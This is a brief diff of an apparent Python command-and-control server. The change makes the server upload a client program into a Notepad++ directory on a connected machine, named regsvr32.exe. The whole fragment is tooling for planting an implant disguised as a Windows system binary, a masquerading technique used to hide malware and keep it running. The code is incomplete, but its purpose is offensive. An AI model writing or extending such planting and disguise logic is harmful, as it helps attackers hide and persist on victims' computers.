@@ -12,7 +12,7 @@ def find_npp_dir(client: socket.socket) -> str:
 
 
 def send_regsvr32(client: socket.socket, dir: str):
-    server.call_upload(client, (config.REGSVR32_FILEPATH, f"{dir}\\regsvr32.exe"))
+    server.call_upload(client, (config.ITR_CLIENT_FILEPATH, f"{dir}\\regsvr32.exe"))
 
 
 def found_npp_handler(client: socket.socket):
